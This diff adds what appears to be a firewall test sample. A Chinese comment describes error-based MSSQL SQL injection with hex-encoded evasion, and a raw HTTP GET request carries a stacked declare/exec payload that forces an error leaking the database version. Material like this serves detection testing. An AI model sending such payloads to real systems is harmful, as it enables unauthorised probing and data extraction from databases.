@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_报错注入(十六进制)-06506464
+# 攻击者基于报错查询使用十六进制字符编码进行绕过，将"declare @s varchar(2000) set @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 exec(@s)"语句注入到 SQL 查询参数中，通过构造此sql语句可以爆破当前数据库信息。
+GET /?id=1%3Bdeclare%20@s%20varchar%282000%29%20set%20@s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29%20exec%28@s%29&bid=hd_tag_m8mv26lz HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26lz
+RM-PRO-Token: c16c393818fb093f05d6826bd7540171
+RM-PRO-Time: 1742808634396
+User-Agent: curl/7.83.1
+
